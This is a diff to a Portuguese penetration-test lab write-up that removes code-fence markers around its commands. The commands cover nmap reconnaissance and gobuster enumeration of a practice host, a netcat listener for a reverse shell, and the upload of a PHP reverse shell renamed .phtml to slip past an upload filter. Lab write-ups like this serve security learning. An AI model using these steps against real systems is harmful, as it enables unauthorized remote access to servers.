@@ -23,9 +23,9 @@ reversa e (opcionalmente) força bruta de credenciais SSH.
 
 ### 1. Reconhecimento (Nmap)
 
-\`\`\`bash
+bash
 nmap -Pn -O 10.64.131.169
-\`\`\`
+
 
 **Resultado:**
 \`\`\`
@@ -43,9 +43,9 @@ foi o alvo da enumeração web a seguir.
 
 ### 2. Enumeração de diretórios web (Gobuster)
 
-\`\`\`bash
+bash
 gobuster dir -u http://10.64.131.169:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
-\`\`\`
+
 
 **Resultado:** encontrado o diretório `/internal/`, que continha um
 formulário de upload de arquivos sem validação adequada de extensão/tipo.
@@ -54,9 +54,9 @@ formulário de upload de arquivos sem validação adequada de extensão/tipo.
 
 Preparado um listener para receber a conexão reversa:
 
-\`\`\`bash
+bash
 nc -lvnp 1234
-\`\`\`
+
 
 Upload de um `php-reverse-shell.phtml` (extensão usada para contornar
 filtro de upload que bloqueava `.php`) através do formulário encontrado
